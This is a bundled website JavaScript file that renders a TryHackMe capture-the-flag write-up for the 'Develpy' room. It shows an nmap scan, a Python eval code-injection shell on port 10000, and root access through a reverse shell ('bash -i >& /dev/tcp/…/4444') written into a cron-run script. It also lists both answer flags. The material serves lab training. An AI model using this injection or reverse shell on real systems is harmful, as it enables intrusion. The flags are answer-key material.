"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8234],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>d});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=r.createContext({}),x=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},p=function(e){var n=x(e.components);return r.createElement(s.Provider,{value:n},e.children)},c="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,i=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),c=x(t),m=o,d=c["".concat(s,".").concat(m)]||c[m]||u[m]||i;return t?r.createElement(d,a(a({ref:n},p),{},{components:t})):r.createElement(d,a({ref:n},p))}));function d(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var i=t.length,a=new Array(i);a[0]=m;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[c]="string"==typeof e?e:o,a[1]=l;for(var x=2;x<i;x++)a[x]=t[x];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},45161:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>l,toc:()=>x});var r=t(87462),o=(t(67294),t(3905));const i={},a="Develpy",l={unversionedId:"Tryhackme/Develpy/Develpy",id:"Tryhackme/Develpy/Develpy",title:"Develpy",description:"boot2root machine for FIT and bsides Guatemala CTF",source:"@site/writeups/Tryhackme/Develpy/Develpy.md",sourceDirName:"Tryhackme/Develpy",slug:"/Tryhackme/Develpy/",permalink:"/writeups/Tryhackme/Develpy/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Dave's Blog",permalink:"/writeups/Tryhackme/Daves Blog/"},next:{title:"dogcat",permalink:"/writeups/Tryhackme/Dogcat/"}},s={},x=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Develpy",id:"task-1-develpy",level:2}],p={toc:x},c="wrapper";function u(e){let{components:n,...t}=e;return(0,o.kt)(c,(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"develpy"},"Develpy"),(0,o.kt)("p",null,"boot2root machine for FIT and bsides Guatemala CTF"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bsidesgtdevelpy"},"Develpy")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Code Injection (RCE)"),(0,o.kt)("li",{parentName:"ul"},"Exploiting Crontab")),(0,o.kt)("h2",{id:"task-1-develpy"},"Task 1 Develpy"),(0,o.kt)("p",null,"read user.txt and root.txt"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Develpy$ sudo nmap -A -sS -sC -sV -O -p- 10.10.120.12\n[sudo] password for kali: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 20:54 CEST\nNmap scan report for 10.10.120.12\nHost is up (0.034s latency).\nNot shown: 65533 closed ports\nPORT      STATE SERVICE           VERSION\n22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)\n|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)\n|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)\n10000/tcp open  snet-sensor-mgmt?\n| fingerprint-strings: \n|   GenericLines: \n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 0\n|     SyntaxError: unexpected EOF while parsing\n|   GetRequest: \n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 1, in <module>\n|     NameError: name \'GET\' is not defined\n|   HTTPOptions, RTSPRequest: \n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 1, in <module>\n|     NameError: name \'OPTIONS\' is not defined\n|   NULL: \n|     Private 0days\n|_    Please enther number of exploits to send??:\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port10000-TCP:V=7.80%I=7%D=10/15%Time=5F889B14%P=x86_64-pc-linux-gnu%r(\nSF:NULL,48,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x\nSF:20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20")\nSF:%r(GetRequest,136,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\nSF:\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\\nSF:?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20Fil\nSF:e\\x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20in\\x20<module>\\r\\n\\x20\\x20\\x2\nSF:0\\x20num_exploits\\x20=\\x20int\\(input\\(\'\\x20Please\\x20enther\\x20number\\x\nSF:20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\\n\\x20\\x20File\\x20\\"<stri\nSF:ng>\\",\\x20line\\x201,\\x20in\\x20<module>\\r\\nNameError:\\x20name\\x20\'GET\'\\x\nSF:20is\\x20not\\x20defined\\r\\n")%r(HTTPOptions,13A,"\\r\\n\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20\nSF:of\\x20exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20c\nSF:all\\x20last\\):\\r\\n\\x20\\x20File\\x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20\nSF:in\\x20<module>\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\'\\x2\nSF:0Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\nSF:\\)\\r\\n\\x20\\x20File\\x20\\"<string>\\",\\x20line\\x201,\\x20in\\x20<module>\\r\\n\nSF:NameError:\\x20name\\x20\'OPTIONS\'\\x20is\\x20not\\x20defined\\r\\n")%r(RTSPReq\nSF:uest,13A,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\\nSF:x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20T\nSF:raceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\x20\\"\\.\nSF:/exploit\\.py\\",\\x20line\\x206,\\x20in\\x20<module>\\r\\n\\x20\\x20\\x20\\x20num_\nSF:exploits\\x20=\\x20int\\(input\\(\'\\x20Please\\x20enther\\x20number\\x20of\\x20e\nSF:xploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\\n\\x20\\x20File\\x20\\"<string>\\",\\x2\nSF:0line\\x201,\\x20in\\x20<module>\\r\\nNameError:\\x20name\\x20\'OPTIONS\'\\x20is\\\nSF:x20not\\x20defined\\r\\n")%r(GenericLines,13B,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x\nSF:20exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\\nSF:x20last\\):\\r\\n\\x20\\x20File\\x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20in\\x\nSF:20<module>\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\'\\x20Ple\nSF:ase\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\nSF:\\n\\x20\\x20File\\x20\\"<string>\\",\\x20line\\x200\\r\\n\\x20\\x20\\x20\\x20\\r\\n\\x2\nSF:0\\x20\\x20\\x20\\^\\r\\nSyntaxError:\\x20unexpected\\x20EOF\\x20while\\x20parsin\nSF:g\\r\\n");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=38173%PV=Y%DS=2%DC=T%G=Y%TM=5F889B\nOS:97%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT      ADDRESS\n1   34.19 ms 10.8.0.1\n2   34.65 ms 10.10.120.12\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 173.85 seconds\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"view-source:http://10.10.120.12:10000/"},"view-source:http://10.10.120.12:10000/")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"\n        Private 0days\n\n Please enther number of exploits to send??: Traceback (most recent call last):\n  File \"./exploit.py\", line 6, in <module>\n    num_exploits = int(input(' Please enther number of exploits to send??: '))\n  File \"<string>\", line 1, in <module>\nNameError: name 'GET' is not defined\n\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'ali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: 2\n\nExploit started, attacking target (tryhackme.com)...\nExploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.041 ms\nExploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.055 ms\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: "a"    \nTraceback (most recent call last):\n  File "./exploit.py", line 6, in <module>\n    num_exploits = int(input(\' Please enther number of exploits to send??: \'))\nValueError: invalid literal for int() with base 10: \'a\'\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n\nExploit started, attacking target (tryhackme.com)...\nTraceback (most recent call last):\n  File "./exploit.py", line 9, in <module>\n    for i in range(num_exploits):\nOverflowError: range() result has too many items\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: eval(1)\nTraceback (most recent call last):\n  File "./exploit.py", line 6, in <module>\n    num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n  File "<string>", line 1, in <module>\nTypeError: eval() arg 1 must be a string or code object\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: eval("1")\n\nExploit started, attacking target (tryhackme.com)...\nExploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.020 ms\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: eval ("1+1")\n\nExploit started, attacking target (tryhackme.com)...\nExploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.032 ms\nExploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.094 ms\nkali@kali:~/CTFs/tryhackme/Develpy$ nc 10.10.120.12 10000\n\n        Private 0days\n\n Please enther number of exploits to send??: __import__(\'os\').system(\'bash\')\nbash: cannot set terminal process group (759): Inappropriate ioctl for device\nbash: no job control in this shell\nking@ubuntu:~$ whoami\nking\nking@ubuntu:~$ pwd\n/home/king\nking@ubuntu:~$ ls\ncredentials.png  exploit.py  root.sh  run.sh  user.txt\nking@ubuntu:~$ cat user.txt\ncf85ff769cfaaa721758949bf870b019\nking@ubuntu:~$\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"king@ubuntu:~$ sudo -l\nsudo: no tty present and no askpass program specified\nking@ubuntu:~$ id\nuid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)\nking@ubuntu:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *    * * *   king    cd /home/king/ && bash run.sh\n*  *    * * *   root    cd /home/king/ && bash root.sh\n*  *    * * *   root    cd /root/company && bash run.sh\n#\nking@ubuntu:~$ ls\ncredentials.png  exploit.py  root.sh  run.sh  user.txt\nking@ubuntu:~$ rm -rf root.sh\nking@ubuntu:~$ ls\ncredentials.png  exploit.py  run.sh  user.txt\nking@ubuntu:~$ echo \"bash -i >& /dev/tcp/10.8.106.222/4444 0>&1\" > root.sh\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Develpy$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.120.12] 47824\nbash: cannot set terminal process group (1227): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@ubuntu:/home/king# cd /root\ncd /root\nroot@ubuntu:~# ls\nls\ncompany\nroot.txt\nroot@ubuntu:~# cat root.txt\ncat root.txt\n9c37646777a53910a347f387dce025ec\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"cf85ff769cfaaa721758949bf870b019")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"9c37646777a53910a347f387dce025ec")))}u.isMDXComponent=!0}}]);